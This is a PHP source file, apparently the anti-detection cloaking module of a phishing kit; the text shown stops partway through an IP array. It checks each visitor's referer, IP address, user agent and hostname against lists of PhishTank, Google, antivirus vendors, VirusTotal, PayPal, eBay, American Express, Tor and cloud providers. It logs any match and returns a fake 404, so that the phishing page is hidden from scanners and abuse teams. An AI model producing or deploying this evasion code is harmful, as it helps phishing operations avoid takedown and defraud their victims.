<?php


include '../string.php';


include '../antifuk.php';
if (isset($_SERVER['HTTP_REFERER'])) {
  if (parse_url($_SERVER['HTTP_REFERER'], PHP_URL_HOST) == 'phishtank.com') {
    $content = "#> " . $_SERVER['HTTP_USER_AGENT'] . " [ Phishtank ] \r\n";
    $save = fopen("../../bots.txt", "a+");
    fwrite($save, $content);
    fclose($save);
    header("HTTP/1.0 404 Not Found");
    exit();

  }
}

if (isset($_SERVER['HTTP_REFERER'])) {
  if (parse_url($_SERVER['HTTP_REFERER'], PHP_URL_HOST) == 'www.phishtank.com') {
    $content = "#> " . $_SERVER['HTTP_USER_AGENT'] . " [ Phishtank ] \r\n";
    $save = fopen("../../bots.txt", "a+");
    fwrite($save, $content);
    fclose($save);
    header("HTTP/1.0 404 Not Found");
    exit();

  }
}

### Check if the ip between 146.112.0.0 And 146.112.255.255 ###
$range_start = ip2long("146.112.0.0");
$range_end = ip2long("146.112.255.255");
$ip2long = ip2long($_SERVER['REMOTE_ADDR']);

if ($ip2long >= $range_start && $ip2long <= $range_end) {
  $content = "#> " . $_SERVER['HTTP_USER_AGENT'] . " [ Blacklist ] \r\n";
  $save = fopen("../../bots.txt", "a+");
  fwrite($save, $content);
  fclose($save);
  header("HTTP/1.0 404 Not Found");
  exit();

}

$Bots = array("abot", "dbot", "ebot", "hbot", "kbot", "lbot", "mbot", "nbot", "obot", "pbot", "rbot", "sbot", "tbot", "vbot", "ybot", "zbot", "bot.", "bot/", "_bot", ".bot", "/bot", "-bot", ":bot", "(bot", "crawl", "slurp", "spider", "seek", "accoona", "acoon", "adressendeutschland", "ah-ha.com", "ahoy", "altavista", "ananzi", "anthill", "appie", "arachnophilia", "arale", "araneo", "aranha", "architext", "aretha", "arks", "asterias", "atlocal", "atn", "atomz", "augurfind", "backrub", "bannana_bot", "baypup", "bdfetch", "bigbrother", "biglotron", "bjaaland", "blackwidow", "blaiz", "blog", "blo.", "bloodhound", "boitho", "booch", "bradley", "butterfly", "calif", "cassandra", "ccubee", "cfetch", "charlotte", "churl", "cienciaficcion", "cmc", "collective", "comagent", "combine", "computingsite", "csci", "curl", "cusco", "daumoa", "deepindex", "delorie", "depspid", "deweb", "dieblindekuh", "digger", "ditto", "dmoz", "docomo", "downloadexpress", "dtaagent", "dwcp", "ebiness", "ebingbong", "e-collector", "ejupiter", "emacs-w3searchengine", "esther", "evliyacelebi", "ezresult", "falcon", "felixide", "ferret", "fetchrover", "fido", "findlinks", "fireball", "fishsearch", "fouineur", "funnelweb", "gazz", "gcreep", "genieknows", "getterroboplus", "geturl", "glx", "goforit", "golem", "grabber", "grapnel", "gralon", "griffon", "gromit", "grub", "gulliver", "hamahakki", "harvest", "havindex", "helix", "heritrix", "hkuwwwoctopus", "homerweb", "htdig", "htmlindex", "html_analyzer", "htmlgobble", "hubater", "hyper-decontextualizer", "ia_archiver", "ibm_planetwide", "ichiro", "iconsurf", "iltrovatore", "image.kapsi.net", "imagelock", "incywincy", "indexer", "infobee", "informant", "ingrid", "inktomisearch.com", "inspectorweb", "intelliagent", "internetshinchakubin", "ip3000", "iron33", "israeli-search", "ivia", "jack", "jakarta", "javabee", "jetbot", "jumpstation", "katipo", "kdd-explorer", "kilroy", "knowledge", "kototoi", "kretrieve", "labelgrabber", "lachesis", "larbin", "legs", "libwww", "linkalarm", "linkvalidator", "linkscan", "lockon", "lwp", "lycos", "magpie", "mantraagent", "mapoftheinternet", "marvin/", "mattie", "mediafox", "mediapartners", "mercator", "merzscope", "microsofturlcontrol", "minirank", "miva", "mj12", "mnogosearch", "moget", "monster", "moose", "motor", "multitext", "muncher", "muscatferret", "mwd.search", "myweb", "najdi", "nameprotect", "nationaldirectory", "nazilla", "ncsabeta", "nec-meshexplorer", "nederland.zoek", "netcartawebmapengine", "netmechanic", "netresearchserver", "netscoop", "newscan-online", "nhse", "nokia6682/", "nomad", "noyona", "siteexplorer", "nutch", "nzexplorer", "objectssearch", "occam", "omni", "opentext", "openfind", "openintelligencedata", "orbsearch", "osis-project", "packrat", "pageboy", "pagebull", "page_verifier", "panscient", "parasite", "partnersite", "patric", "pear.", "pegasus", "peregrinator", "pgpkeyagent", "phantom", "phpdig", "picosearch", "piltdownman", "pimptrain", "pinpoint", "pioneer", "piranha", "plumtreewebaccessor", "pogodak", "poirot", "pompos", "poppelsdorf", "poppi", "populariconoclast", "psycheclone", "publisher", "python", "rambler", "ravensearch", "roach", "roadrunner", "roadhouse", "robbie", "robofox", "robozilla", "rules", "salty", "sbider", "scooter", "scoutjet", "scrubby", "search.", "searchprocess", "semanticdiscovery", "senrigan", "sg-scout", "shai'hulud", "shark", "shopwiki", "sidewinder", "sift", "silk", "simmany", "sitesearcher", "sitevalet", "sitetech-rover", "skymob.com", "sleek", "smartwit", "sna-", "snappy", "snooper", "sohu", "speedfind", "sphere", "sphider", "spinner", "spyder", "steeler/", "suke", "suntek", "supersnooper", "surfnomore", "sven", "sygol", "szukacz", "tachblackwidow", "tarantula", "templeton", "/teoma", "t-h-u-n-d-e-r-s-t-o-n-e", "theophrastus", "titan", "titin", "tkwww", "toutatis", "t-rex", "tutorgig", "twiceler", "twisted", "ucsd", "udmsearch", "urlcheck", "updated", "vagabondo", "valkyrie", "verticrawl", "victoria", "vision-search", "volcano", "voyager/", "voyager-hc", "w3c_validator", "w3m2", "w3mir", "walker", "wallpaper", "wanderer", "wauuu", "wavefire", "webcore", "webhopper", "webwombat", "webbandit", "webcatcher", "webcopy", "webfoot", "weblayers", "weblinker", "weblogmonitor", "webmirror", "webmonkey", "webquest", "webreaper", "websitepulse", "websnarf", "webstolperer", "webvac", "webwalk", "webwatch", "webwombat", "webzinger", "wget", "whizbang", "whowhere", "wildferret", "worldlight", "wwwc", "wwwster", "xenu", "xget", "xift", "xirq", "yandex", "yanga", "yeti", "yodao", "zao/", "zippp", "zyborg", "proximic", "Googlebot", "Baiduspider", "Cliqzbot", "A6-Indexer", "AhrefsBot", "Genieo", "BomboraBot", "CCBot", "URLAppendBot", "DomainAppender", "msnbot-media", "Antivirus", "YoudaoBot", "MJ12bot", "linkdexbot", "Go-http-client", "Googlebot", "Baiduspider", "PhantomJS", "applebot", "metauri.com", "Twitterbot", "ia_archiver", "R6_FeedFetcher", "NetcraftSurveyAgent", "Sogouwebspider", "bingbot", "Yahoo!Slurp", "facebookexternalhit", "PrintfulBot", "msnbot", "Twitterbot", "UnwindFetchor", "urlresolver", "Butterfly", "TweetmemeBot", "PaperLiBot", "MJ12bot", "AhrefsBot", "Exabot", "Ezooms", "YandexBot", "SearchmetricsBot", "picsearch", "TweetedTimesBot", "QuerySeekerSpider", "ShowyouBot", "woriobot", "merlinkbot", "BazQuxBot", "Kraken", "SISTRIXCrawler", "R6_CommentReader", "magpie-crawler", "GrapeshotCrawler", "PercolateCrawler", "MaxPointCrawler", "R6_FeedFetcher", "NetSeercrawler", "grokkit-crawler", "SMXCrawler", "PulseCrawler", "Y!J-BRW", "80legs.com/webcrawler", "Mediapartners-Google", "Spinn3r", "InAGist", "Python-urllib", "NING", "TencentTraveler", "Feedfetcher-Google", "mon.itor.us", "spbot", "Feedly", "bot", "java", "curl", "spider", "crawler");

if (in_array($_SERVER['REMOTE_ADDR'], $Bots)) {
  $content = "#> " . $_SERVER['HTTP_USER_AGENT'] . " [ Bot ] \r\n";
  $save = fopen("../../bots.txt", "a+");
  fwrite($save, $content);
  fclose($save);
  header("HTTP/1.0 404 Not Found");
  exit();

}

$Botname = array( // LIST BOOTS NAME
  "bot",
  "above",
  "google",
  "softlayer",
  "amazonaws",
  "cyveillance",
  "compatible",
  "facebook",
  "phishtank",
  "dreamhost",
  "netpilot",
  "calyxinstitute",
  "tor-exit",
  "apache-httpclient",
  "lssrocketcrawler",
  "Trident",
  "X11",
  "Macintosh",
  "crawler",
  "urlredirectresolver",
  "jetbrains",
  "spam",
  "windows95",
  "windows98",
  "acunetix",
  "netsparker",
  "google",
  "007ac9",
  "008",
  "192.comagent",
  "200pleasebot",
  "360spider",
  "4seohuntbot",
  "50.nu",
  "a6-indexer",
  "admantx",
  "amznkassocbot",
  "aboundexbot",
  "aboutusbot",
  "abravespider",
  "accelobot",
  "acoonbot",
  "addthis.com",
  "adsbot-google",
  "ahrefsbot",
  "alexabot",
  "amagit.com",
  "analytics",
  "antbot",
  "apercite",
  "aportworm",
  "arabot",
  "crawl",
  "slurp",
  "spider",
  "seek",
  "accoona",
  "acoon",
  "adressendeutschland",
  "ah-ha.com",
  "ahoy",
  "altavista",
  "ananzi",
  "anthill",
  "appie",
  "arachnophilia",
  "arale",
  "araneo",
  "aranha",
  "architext",
  "aretha",
  "arks",
  "asterias",
  "atlocal",
  "atn",
  "atomz",
  "augurfind",
  "backrub",
  "bannana_bot",
  "baypup",
  "bdfetch",
  "bigbrother",
  "biglotron",
  "bjaaland",
  "blackwidow",
  "blaiz",
  "blog",
  "blo.",
  "bloodhound",
  "boitho",
  "booch",
  "bradley",
  "butterfly",
  "calif",
  "cassandra",
  "ccubee",
  "cfetch",
  "charlotte",
  "churl",
  "cienciaficcion",
  "cmc",
  "collective",
  "comagent",
  "combine",
  "computingsite",
  "csci",
  "curl",
  "cusco",
  "daumoa",
  "deepindex",
  "delorie",
  "depspid",
  "deweb",
  "dieblindekuh",
  "digger",
  "ditto",
  "dmoz",
  "docomo",
  "downloadexpress",
  "dtaagent",
  "dwcp",
  "ebiness",
  "ebingbong",
  "e-collector",
  "ejupiter",
  "emacs-w3searchengine",
  "esther",
  "evliyacelebi",
  "ezresult",
  "falcon",
  "felixide",
  "ferret",
  "fetchrover",
  "fido",
  "findlinks",
  "fireball",
  "fishsearch",
  "fouineur",
  "funnelweb",
  "gazz",
  "gcreep",
  "genieknows",
  "getterroboplus",
  "geturl",
  "glx",
  "goforit",
  "golem",
  "grabber",
  "grapnel",
  "gralon",
  "griffon",
  "gromit",
  "grub",
  "gulliver",
  "hamahakki",
  "harvest",
  "havindex",
  "helix",
  "heritrix",
  "hkuwwwoctopus",
  "homerweb",
  "htdig",
  "htmlindex",
  "html_analyzer",
  "htmlgobble",
  "hubater",
  "hyper-decontextualizer",
  "ia_archiver",
  "ibm_planetwide",
  "ichiro",
  "iconsurf",
  "iltrovatore",
  "image.kapsi.net",
  "imagelock",
  "incywincy",
  "indexer",
  "infobee",
  "informant",
  "ingrid",
  "inktomisearch.com",
  "inspectorweb",
  "intelliagent",
  "internetshinchakubin",
  "ip3000",
  "iron33",
  "israeli-search",
  "ivia",
  "jack",
  "jakarta",
  "javabee",
  "jetbot",
  "jumpstation",
  "katipo",
  "kdd-explorer",
  "kilroy",
  "knowledge",
  "kototoi",
  "kretrieve",
  "labelgrabber",
  "lachesis",
  "larbin",
  "legs",
  "libwww",
  "linkalarm",
  "linkvalidator",
  "linkscan",
  "lockon",
  "lwp",
  "lycos",
  "magpie",
  "mantraagent",
  "mapoftheinternet",
  "marvin/",
  "mattie",
  "mediafox",
  "mediapartners",
  "mercator",
  "merzscope",
  "microsofturlcontrol",
  "minirank",
  "miva",
  "mj12",
  "mnogosearch",
  "moget",
  "monster",
  "moose",
  "motor",
  "multitext",
  "muncher",
  "muscatferret",
  "mwd.search",
  "myweb",
  "najdi",
  "nameprotect",
  "nationaldirectory",
  "nazilla",
  "ncsabeta",
  "nec-meshexplorer",
  "nederland.zoek",
  "netcartawebmapengine",
  "netmechanic",
  "netresearchserver",
  "netscoop",
  "newscan-online",
  "nhse",
  "nokia6682/",
  "nomad",
  "noyona",
  "nutch",
  "nzexplorer",
  "objectssearch",
  "occam",
  "omni",
  "opentext",
  "openfind",
  "openintelligencedata",
  "orbsearch",
  "osis-project",
  "packrat",
  "pageboy",
  "pagebull",
  "page_verifier",
  "panscient",
  "parasite",
  "partnersite",
  "patric",
  "pear.",
  "pegasus",
  "peregrinator",
  "pgpkeyagent",
  "phantom",
  "phpdig",
  "picosearch",
  "piltdownman",
  "pimptrain",
  "pinpoint",
  "pioneer",
  "piranha",
  "plumtreewebaccessor",
  "pogodak",
  "poirot",
  "pompos",
  "poppelsdorf",
  "poppi",
  "populariconoclast",
  "psycheclone",
  "publisher",
  "python",
  "rambler",
  "ravensearch",
  "roach",
  "roadrunner",
  "roadhouse",
  "robbie",
  "robofox",
  "robozilla",
  "rules",
  "salty",
  "sbider",
  "scooter",
  "scoutjet",
  "scrubby",
  "search.",
  "searchprocess",
  "semanticdiscovery",
  "senrigan",
  "sg-scout",
  "shai'hulud",
  "shark",
  "shopwiki",
  "sidewinder",
  "sift",
  "silk",
  "simmany",
  "sitesearcher",
  "sitevalet",
  "sitetech-rover",
  "skymob.com",
  "sleek",
  "smartwit",
  "sna-",
  "snappy",
  "snooper",
  "sohu",
  "speedfind",
  "sphere",
  "sphider",
  "spinner",
  "spyder",
  "steeler/",
  "suke",
  "suntek",
  "supersnooper",
  "surfnomore",
  "sven",
  "sygol",
  "szukacz",
  "tachblackwidow",
  "tarantula",
  "templeton",
  "/teoma",
  "t-h-u-n-d-e-r-s-t-o-n-e",
  "theophrastus",
  "titan",
  "titin",
  "tkwww",
  "toutatis",
  "t-rex",
  "tutorgig",
  "twiceler",
  "twisted",
  "ucsd",
  "udmsearch",
  "urlcheck",
  "updated",
  "vagabondo",
  "valkyrie",
  "verticrawl",
  "victoria",
  "vision-search",
  "volcano",
  "voyager/",
  "voyager-hc",
  "w3c_validator",
  "w3m2",
  "w3mir",
  "walker",
  "wallpaper",
  "wanderer",
  "wauuu",
  "wavefire",
  "webcore",
  "webhopper",
  "webwombat",
  "webbandit",
  "webcatcher",
  "webcopy",
  "webfoot",
  "weblayers",
  "weblinker",
  "weblogmonitor",
  "webmirror",
  "webmonkey",
  "webquest",
  "webreaper",
  "websitepulse",
  "websnarf",
  "webstolperer",
  "webvac",
  "webwalk",
  "webwatch",
  "webwombat",
  "webzinger",
  "wget",
  "whizbang",
  "whowhere",
  "wildferret",
  "worldlight",
  "wwwc",
  "wwwster",
  "xenu",
  "xift",
  "xirq",
  "yandex",
  "yanga",
  "yeti",
  "yahoo!"
);

foreach ($Botname as $words) {
  if (stripos($_SERVER['HTTP_USER_AGENT'], $words)) {
    $content = "#> " . $_SERVER['HTTP_USER_AGENT'] . " [ Bot ] \r\n";
    $save = fopen("../../bots.txt", "a+");
    fwrite($save, $content);
    fclose($save);
    header("HTTP/1.0 404 Not Found");
    exit();

  }
}
if (
  strpos($_SERVER['HTTP_USER_AGENT'], 'google')
  or strpos($_SERVER['HTTP_USER_AGENT'], 'Java')
  or strpos($_SERVER['HTTP_USER_AGENT'], 'FreeBSD')
  or strpos($_SERVER['HTTP_USER_AGENT'], 'msnbot')
  or strpos($_SERVER['HTTP_USER_AGENT'], 'Yahoo! Slurp')
  or strpos($_SERVER['HTTP_USER_AGENT'], 'YahooSeeker')
  or strpos($_SERVER['HTTP_USER_AGENT'], 'Googlebot')
  or strpos($_SERVER['HTTP_USER_AGENT'], 'bingbot')
  or strpos($_SERVER['HTTP_USER_AGENT'], 'crawler')
  or strpos($_SERVER['HTTP_USER_AGENT'], 'PycURL')
  or strpos($_SERVER['HTTP_USER_AGENT'], 'facebookexternalhit') !== false
) {

  $content = "#> " . $_SERVER['HTTP_USER_AGENT'] . " [ Bot ] \r\n";
  $save = fopen("../../bots.txt", "a+");
  fwrite($save, $content);
  fclose($save);
  header("HTTP/1.0 404 Not Found");
  exit();

}

if ($_SERVER['HTTP_USER_AGENT'] == "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; .NET CLR 2.0.50727)") {

  $content = "#> " . $_SERVER['HTTP_USER_AGENT'] . " [ Bot ] \r\n";
  $save = fopen("../../bots.txt", "a+");
  fwrite($save, $content);
  fclose($save);
  header("HTTP/1.0 404 Not Found");
  exit();

}


$ipsed = $_SERVER['REMOTE_ADDR'];
$IP_Banned = array(
  "^81.161.59.*",
  "^66.135.200.*",
  "^91.103.66.*",
  "^208.91.115.*",
  "^199.30.228.*",
  "^66.102.*.*",
  "^38.100.*.*",
  "^107.170.*.*",
  "^149.20.*.*",
  "^38.105.*.*",
  "^74.125.*.*",
  "^66.150.14.*",
  "^54.176.*.*",
  "^184.173.*.*",
  "^66.249.*.*",
  "^128.242.*.*",
  "^72.14.192.*",
  "^208.65.144.*",
  "^209.85.128.*",
  "^216.239.32.*",
  "^207.126.144.*",
  "^173.194.*.*",
  "^64.233.160.*",
  "^64.18.*.*",
  "^194.52.68.*",
  "^194.72.238.*",
  "^62.116.207.*",
  "^212.50.193.*",
  "^69.65.*.*",
  "^50.7.*.*",
  "^131.212.*.*",
  "^62.90.*.*",
  "^89.138.*.*",
  "^82.166.*.*",
  "^85.64.*.*",
  "^85.250.*.*",
  "^93.172.*.*",
  "^109.186.*.*",
  "^194.90.*.*",
  "^212.29.192.*",
  "^212.29.224.*",
  "^212.143.*.*",
  "^212.150.*.*",
  "^212.235.*.*",
  "^217.132.*.*",
  "^50.97.*.*",
  "^209.85.*.*",
  "^66.205.64.*",
  "^204.14.48.*",
  "^64.27.2.*",
  "^67.15.*.*",
  "^202.108.252.*",
  "^193.47.80.*",
  "^64.62.136.*",
  "^66.221.*.*",
  "^64.62.175.*",
  "^198.54.*.*",
  "^192.115.134.*",
  "^216.252.167.*",
  "^193.253.199.*",
  "^69.61.12.*",
  "^64.37.103.*",
  "^38.144.36.*",
  "^64.124.14.*",
  "^206.28.72.*",
  "^209.73.228.*",
  "^158.108.*.*",
  "^168.188.*.*",
  "^66.207.120.*",
  "^167.24.*.*",
  "^192.118.48.*",
  "^67.209.128.*",
  "^12.148.209.*",
  "^12.148.196.*",
  "^193.220.178.*",
  "68.65.53.71",
  "^198.25.*.*",
  "^64.106.213.*",
  "54.228.218.117",
  "^54.228.218.*",
  "185.28.20.243",
  "^185.28.20.*",
  "217.16.26.166",
  "^217.16.26.*",
  "50.16.241.113",
  "50.16.241.114",
  "50.16.241.117",
  "50.16.247.234",
  "52.204.97.54",
  "52.5.190.19",
  "54.197.234.188",
  "54.208.100.253",
  "23.21.227.69",
  "65.214.45.143",
  "65.214.45.148",
  "66.235.124.192",
  "66.235.124.7",
  "66.235.124.101",
  "66.235.124.193",
  "66.235.124.73",
  "66.235.124.196",
  "66.235.124.74",
  "63.123.238.8",
  "202.143.148.61",
  "66.249.66.1",
  "1.9.2.13",
  "1.9.2.15",
  "62.210.13.58",
  "104.62.2.60",
  "104.83.233.198",
  "107.178.194.64",
  "108.161.29.60",
  "115.238.55.18",
  "119.97.214.138",
  "138.197.207.*",
  "145.239.156.71",
  "145.239.156.89",
  "150.70.168.35",
  "150.70.188.167",
  "154.127.57.30",
  "162.243.128.197",
  "162.243.187.126",
  "162.243.69.215",
  "165.227.0.128",
  "170.250.139.48",
  "138.197.207.147",
  "173.230.147.44",
  "177.39.232.144",
  "178.17.170.156",
  "185.104.186.168",
  "185.220.101.26",
  "185.28.20.243",
  "188.166.63.71",
  "192.36.27.7",
  "196.52.84.81",
  "204.13.201.137",
  "208.87.233.140",
  "212.83.139.219",
  "212.92.117.5",
  "216.164.117.239",
  "217.16.26.166",
  "217.96.188.74",
  "219.117.238.170",
  "23.27.153.247",
  "23.27.154.37",
  "24.23.24.144",
  "27.0.1453.110",
  "3.0.04506.648",
  "3.0.4506.2152",
  "31.168.158.239",
  "34.237.113.113",
  "39.0.2150.5",
  "41.0.2272.118",
  "43.0.2357.81",
  "44.0.2403.155",
  "46.101.94.163",
  "5.62.39.18",
  "5.62.41.35",
  "5.62.56.91",
  "50.112.194.65",
  "50.116.2.167",
  "51.0.2704.103",
  "52.18.11.161",
  "52.192.164.225",
  "52.27.2.86",
  "52.31.63.97",
  "52.5.98.73",
  "52.72.33.140",
  "52.87.10.90",
  "52.91.94.56",
  "53.0.2785.116",
  "54.213.103.141",
  "54.228.218.117",
  "54.245.191.79",
  "56.0.2924.87",
  "57.0.2987.98",
  "61.0.3116.0",
  "62.24.252.133",
  "62.67.194.35",
  "63.0.3239.132",
  "64.0.3282.140",
  "64.0.3282.167",
  "66.0.3358.0",
  "66.0.3359.0",
  "67.0.3360.0",
  "67.0.3361.0",
  "68.65.53.71",
  "75.163.12.85",
  "76.19.184.88",
  "77.69.251.230",
  "80.104.176.17",
  "81.0.48.*",
  "81.0.48.138",
  "84.13.191.239",
  "84.92.148.184",
  "88.99.62.141",
  "217.96.197.246",
  "89.234.157.254",
  "91.231.212.111",
  "173.239.240.147",
  "103.248.172.42",
  "87.113.96.90",
  "165.227.0.128",
  "185.229.190.140",
  "165.227.0.128",
  "46.101.94.163",
  "165.227.39.194",
  "87.113.96.90",
  "46.101.119.24",
  "82.102.27.75",
  "173.239.230.97",
  "82.102.27.75",
  "87.113.96.90",
  "46.101.119.24",
  "173.239.230.97",
  "87.113.96.90",
  "87.113.96.90",
  "159.203.0.156",
  "162.243.187.126",
  "82.102.27.75",
  "87.113.96.90",
  "103.248.172.42",
  "103.248.172.42",
  "47.30.133.89",
  "103.248.172.42"
);

if (in_array($ipsed, $IP_Banned)) {
  $content = "#> " . $_SERVER['HTTP_USER_AGENT'] . " [ Banned ] \r\n";
  $save = fopen("../../bots.txt", "a+");
  fwrite($save, $content);
  fclose($save);
  header("HTTP/1.0 404 Not Found");
  exit();

}
$lp = $_SERVER['HTTP_HOST'] . $_SERVER['REQUEST_URI'];
$HOSTNAME = gethostbyaddr($_SERVER['REMOTE_ADDR']);
$blocked_words = array("drweb", "Dr.Web", "hostinger", "scanurl", "above", "google", "facebook", "softlayer", "amazonaws", "cyveillance", "phishtank", "dreamhost", "netpilot", "calyxinstitute", "tor-exit", "msnbot", "p3pwgdsn", "netcraft", "trendmicro", "ebay", "paypal", "torservers", "messagelabs", "sucuri.net", "crawler", "googlebot", "Googlebot-Video", "bingbot", "Baiduspider", "Baiduspider-mobile", "Baiduspider-video", "Baiduspider-image", "NaverBot", "Yeti", "Yandex", "YandexBot", "YandexMobileBot", "YandexVideo", "YandexWebmaster", "YandexSitelinks", "SeznamBot", "AdsBot-Google", "Twitterbot", "Adidxbot", "externalfacebookhit", "Facebot", "Yahoo Pipes 1.0", "facebookexternalhit", "EtaoSpider", "amazon", "netflix", "Slurp", "msnbot", "Applebot", "Googlebot-Image", "teoma", "ia_archiver", "YandexDirect", "gsa-crawler", "OmniExplorer_Bot", "msnbot-mobile", "YahooSeeker", "SPRO-NET-206-80-96", "SPRO-NET-207-70-0", "SPRO-NET-209-19-128", "LVLT-STATIC-4-14-16", "americanexpress", "softlayer", "amazonaws", "cyveillance", "phishtank", "dreamhost", "netpilot", "calyxinstitute", "tor-exit", "paypal");

foreach ($blocked_words as $word) {
  if (substr_count($HOSTNAME, $word) > 0) {
    $content = "#> " . $_SERVER['HTTP_USER_AGENT'] . " [ Bad word ] \r\n";
    $save = fopen("../../bots.txt", "a+");
    fwrite($save, $content);
    fclose($save);
    header("HTTP/1.0 404 Not Found");
    exit();

  }
}

$hostname = gethostbyaddr($_SERVER['REMOTE_ADDR']);
$blocked_words = array("teledata-fttx.de", "hicoria.com", "simtccflow1.etn.com", "above", "google", "softlayer", "amazonaws", "cyveillance", "phishtank", "dreamhost", "netpilot", "calyxinstitute", "tor-exit", "msnbot", "p3pwgdsn", "netcraft", "trendmicro", "ebay", "paypal", "torservers", "messagelabs", "sucuri.net", "crawler", "duckduck", "feedfetcher", "BitDefender", "mcafee", "antivirus", "cloudflare", "p3pwgdsn", "avg", "avira", "avast", "ovh.net", "security", "twitter", "bitdefender", "virustotal", "phising", "clamav", "baidu", "safebrowsing", "eset", "mailshell", "azure", "miniature", "tlh.ro", "aruba", "dyn.plus.net", "pagepeeker", "SPRO-NET-207-70-0", "SPRO-NET-209-19-128", "vultr", "colocrossing.com", "geosr", "drweb", "dr.web", "linode.com", "opendns", 'cymru.com', 'sl-reverse.com', 'surriel.com', 'hosting', 'orange-labs', 'speedtravel', 'metauri', 'apple.com', 'bruuk.sk', 'sysms.net', 'oracle', 'cisco', 'amuri.net', "versanet.de", "hilfe-veripayed.com", "googlebot.com", "upcloud.host", "nodemeter.net", "e-active.nl", "downnotifier", "online-domain-tools", "fetcher6-2.go.mail.ru", "uptimerobot.com", "monitis.com", "colocrossing.com", "majestic12", "as9105.com", "btcentralplus.com", "anonymizing-proxy", "digitalcourage.de", "triolan.net", "staircaseirony", "stelkom.net", "comrise.ru", "kyivstar.net", "mpdedicated.com", "starnet.md", "progtech.ru", "hinet.net", "is74.ru", "shore.net", "cyberinfo", "ipredator", "unknown.telecom.gomel.by", "minsktelecom.by", "parked.factioninc.com");

foreach ($blocked_words as $word) {
  if (substr_count($hostname, $word) > 0) {

    $content = "#> " . $_SERVER['HTTP_USER_AGENT'] . " [ Blocked ] \r\n";
    $save = fopen("../../bots.txt", "a+");
    fwrite($save, $content);
    fclose($save);
    header("HTTP/1.0 404 Not Found");
    exit();

  }
}

$bannedIP = array("66.249.91.*", "66.249.91.203", "^81.161.59.*", "^66.135.200.*", "^66.102.*.*", "^38.100.*.*", "^107.170.*.*", "^149.20.*.*", "^38.105.*.*", "^74.125.*.*", "^66.150.14.*", "^54.176.*.*", "^38.100.*.*", "^184.173.*.*", "^66.249.*.*", "^128.242.*.*", "^72.14.192.*", "^208.65.144.*", "^74.125.*.*", "^209.85.128.*", "^216.239.32.*", "^74.125.*.*", "^207.126.144.*", "^173.194.*.*", "^72.14.192.*", "^66.102.*.*", "^64.18.*.*", "^194.52.68.*", "^194.72.238.*", "^62.116.207.*", "^212.50.193.*", "^69.65.*.*", "^50.7.*.*", "^131.212.*.*", "^46.116.*.* ", "^62.90.*.*", "^89.138.*.*", "^82.166.*.*", "^85.64.*.*", "^85.250.*.*", "^89.138.*.*", "^93.172.*.*", "^109.186.*.*", "^194.90.*.*", "^212.29.192.*", "^212.29.224.*", "^212.143.*.*", "^212.150.*.*", "^212.235.*.*", "^217.132.*.*", "^50.97.*.*", "^217.132.*.*", "^209.85.*.*", "^66.205.64.*", "^204.14.48.*", "^64.27.2.*", "^67.15.*.*", "^202.108.252.*", "^193.47.80.*", "^64.62.136.*", "^66.221.*.*", "^64.62.175.*", "^198.54.*.*", "^192.115.134.*", "^216.252.167.*", "^193.253.199.*", "^69.61.12.*", "^64.37.103.*", "^38.144.36.*", "^64.124.14.*", "^206.28.72.*", "^209.73.228.*", "^158.108.*.*", "^168.188.*.*", "^66.207.120.*", "^167.24.*.*", "^192.118.48.*", "^67.209.128.*", "^12.148.209.*", "^12.148.196.*", "^193.220.178.*", "68.65.53.71", "^198.25.*.*", "^64.106.213.*", "^91.103.66.*", "^208.91.115.*", "^199.30.228.*", "^84.93.84.*", "^182.75.120.*", "^182.75.120.10", "^46.101.43.*", "^147.75.210.*");
if (in_array($_SERVER['REMOTE_ADDR'], $bannedIP)) {

  $content = "#> " . $_SERVER['HTTP_USER_AGENT'] . " [ Banned ] \r\n";
  $save = fopen("../../bots.txt", "a+");
  fwrite($save, $content);
  fclose($save);
  header("HTTP/1.0 404 Not Found");
  exit();


} else {
  foreach ($bannedIP as $ip) {
    if (preg_match('/' . $ip . '/', $_SERVER['REMOTE_ADDR'])) {
      $content = "#> " . $_SERVER['HTTP_USER_AGENT'] . " [ Banned ] \r\n";
      $save = fopen("../../bots.txt", "a+");
      fwrite($save, $content);
      fclose($save);
      header("HTTP/1.0 404 Not Found");
      exit();


    }
  }
}


$v_agent = $_SERVER['HTTP_USER_AGENT'];
if ($v_agent == "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; .NET CLR 2.0.50727)" || $v_agent == "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/600.2.5 (KHTML, like Gecko) Version/8.0.2 Safari/600.2.5 (Applebot/0.1; +http://www.apple.com/go/applebot)") {

  $content = "#> " . $_SERVER['HTTP_USER_AGENT'] . " [ Bot ] \r\n";
  $save = fopen("../../bots.txt", "a+");
  fwrite($save, $content);
  fclose($save);
  header("HTTP/1.0 404 Not Found");
  exit();

}
if ($v_agent == "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; .NET CLR 2.0.50727)") {
  $content = "#> " . $_SERVER['HTTP_USER_AGENT'] . " [ Bot ] \r\n";
  $save = fopen("../../bots.txt", "a+");
  fwrite($save, $content);
  fclose($save);
  header("HTTP/1.0 404 Not Found");
  exit();

}

$id = $_SERVER['REMOTE_ADDR'];
$ips = array(
  "^94.26.*.*",
  "^95.85.*.*",
  "^72.52.96.*",
  "^212.8.79.*",
  "^62.99.77.*",
  "^83.31.118.*",
  "^91.231.*.*",
  "^206.207.*.*",
  "^91.231.212.*",
  "^62.99.77.*",
  "^198.41.243.*",
  "^162.158.*.*",
  "^162.158.7.*",
  "^162.158.72.*",
  "^173.245.55.*",
  "^108.162.246.*",
  "^162.158.95.*",
  "^108.162.215.*",
  "^95.108.194.*",
  "^141.101.104.*",
  "^93.54.82.*",
  "^69.164.145.*",
  "^194.153.113.*",
  "^178.43.117.*",
  "^62.141.65.*",
  "^83.31.69.*",
  "^107.178.195.*",
  "^149.20.54.*",
  "^85.9.7.*",
  "^87.106.251.*",
  "^107.178.194.*",
  "^124.66.185.*",
  "^133.11.204.*",
  "^185.2.138.*",
  "^188.165.83.*",
  "^78.148.13.*",
  "^192.232.213.*",
  "^1.234.41.*",
  "^124.66.185.*",
  "^87.106.251.*",
  "^176.195.231.*",
  "^206.253.226.*",
  "^107.20.181.*",
  "^188.244.39.*",
  "^124.66.185.*",
  "^38.74.138.*",
  "^124.66.185.*",
  "^38.74.138.*",
  "^206.253.226.*",
  "^1.234.41.*",
  "^124.66.185.*",
  "^87.106.251.*",
  "^85.9.7.*",
  "^37.140.188.*",
  "^195.128.227.*",
  "^38.74.138.*",
  "^107.20.181.*",
  "^46.4.120.*",
  "^107.178.194.*",
  "^198.60.236.*",
  "^217.74.103.*",
